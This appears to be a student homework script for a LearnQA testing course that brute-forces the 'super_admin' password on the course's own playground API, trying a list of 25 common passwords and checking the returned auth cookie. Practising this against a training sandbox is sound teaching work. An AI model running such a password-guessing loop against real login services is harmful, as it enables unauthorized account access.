import requests

# Исходные данные
#api_get_secret_pswd = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
#api_check_auth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
#login = 'super_admin'
list_of_passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
                     "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely",
                     "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

#Перебор пароля
for pas in list_of_passwords:
    payloads = {"login": "super_admin", "password": pas}
    get_cookie_response = requests.post("https://playground.learnqa.ru/ajax/api/get_auth_cookie", data=payloads)
    cookie_value = get_cookie_response.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cookie_value}
    check_cookie_response = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if check_cookie_response.text != "You are NOT authorized":
        print(f'{check_cookie_response.text}! The correct password is: {pas}')
        break


